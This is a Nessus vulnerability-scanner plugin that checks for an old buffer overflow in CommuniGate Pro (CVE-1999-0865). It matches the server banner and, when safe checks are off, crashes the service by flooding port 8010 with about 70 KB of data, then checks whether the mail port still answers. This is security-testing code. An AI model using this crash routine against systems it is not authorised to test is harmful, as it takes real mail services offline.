#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10048);
 script_version("$Revision: 1.34 $");
 script_cvs_date("$Date: 2016/10/07 13:30:47 $");

 script_cve_id("CVE-1999-0865");
 script_bugtraq_id(860);
 script_osvdb_id(41);

 script_name(english:"CommuniGate Pro HTTP Configuration Port Remote Overflow");
 script_summary(english:"Crashes the remote service");

  script_set_attribute(attribute:"synopsis", value:"The remote service has a buffer overflow vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running Communigate Pro, a commercial
email and groupware application.

It was possible to crash this service by :

  - First, connecting to port 8010 and sending 70 KB
    of data (AAA[...]AAA) followed by '\r\n'.

  - Then, connecting to port 25.

A remote attacker could exploit this to crash the service, or possibly
execute arbitrary code.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1999/Dec/62");
  script_set_attribute(attribute:"solution", value:"Upgrade to Communigate Pro version 3.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");

  script_set_attribute(attribute:"vuln_publication_date", value:"1999/12/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"1999/12/04");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:communigate:communigate_pro_core_server");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK); # mixed
  script_family(english:"Web Servers");
  script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");

  script_dependencie("find_service1.nasl", "httpver.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports(8010);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if(safe_checks())
{
 banner = get_http_banner(port:8010);

 if(banner)
  {
  if(egrep(pattern:"^Server: CommuniGatePro/3\.[0-1]",
  	  string:banner))
	  {
	   alrt =
"Nessus reports this vulnerability using only information that was
gathered. Use caution when testing without safe checks enabled.";
	   security_hole(port:8010, extra:alrt);
	  }
  }
 exit(0);
}


if(get_port_state(8010))
{
 if(get_port_state(25))
 {
 soc25 = open_sock_tcp(25);
 if(soc25)
 {
  r = recv_line(socket:soc25, length:1024);
  if(!r)exit(0);
  close(soc25);
  soc = open_sock_tcp(8010);
  if(soc)
  {
  data = crap(1024);
  end = string("\r\n");
  for(i=0;i<70;i=i+1)
  {
  send(socket:soc, data:data);
  }
  send(socket:soc, data:end);
  r = http_recv3(socket:soc);
  close(soc);

  soc25 = open_sock_tcp(25);
  rep = recv_line(socket:soc25, length:1024);
  if(!rep)security_hole(8010);
  close(soc25);
   }
  }
 }
}
